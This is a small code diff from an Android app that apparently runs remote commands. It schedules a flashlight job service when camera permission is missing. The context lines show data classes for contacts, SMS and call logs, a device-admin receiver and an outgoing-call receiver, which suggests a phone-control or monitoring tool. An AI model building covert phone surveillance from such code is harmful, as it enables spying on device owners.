@@ -48,6 +48,7 @@ import com.candroid.lofl.data.pojos.CalendarEvent;
 import com.candroid.lofl.data.pojos.Contact;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
+import com.candroid.lofl.jobs.services.FlashlightJobService;
 import com.candroid.lofl.receivers.AdminReceiver;
 import com.candroid.lofl.receivers.OutgoingCallReceiver;
 
@@ -335,6 +336,7 @@ public class CommandsIntentService extends IntentService {
                 if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                     Systems.Camera.persistentBlinkingFlashlight(this);
                 }else{
+                    FlashlightJobService.schedule(this);
                     startPermissionActivity(this, intent, CameraActivity.class);
                 }
             } else if (action.equals(ACTION_VIBRATOR)) {
